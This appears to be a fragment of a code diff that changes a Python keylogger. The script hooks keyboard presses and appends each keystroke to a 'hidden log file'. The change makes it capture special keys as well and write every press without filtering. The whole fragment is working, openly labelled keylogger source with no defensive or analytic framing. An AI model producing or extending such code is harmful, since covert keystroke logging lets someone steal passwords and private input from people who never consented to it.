@@ -19,12 +19,11 @@ def on_press(key):
     try:
         log_entry = key.char  # Normal character keys
     except AttributeError:
-        log_entry = ""  # Ignore special keys
+        log_entry = f" [{key}] "  # Special keys
 
     # Write the keystrokes to the hidden log file
-    if log_entry:
-        with open(hidden_log_file, "a") as f:
-            f.write(log_entry)
+    with open(hidden_log_file, "a") as f:
+        f.write(log_entry)
 
 # Start the keylogger listener
 listener = keyboard.Listener(on_press=on_press)
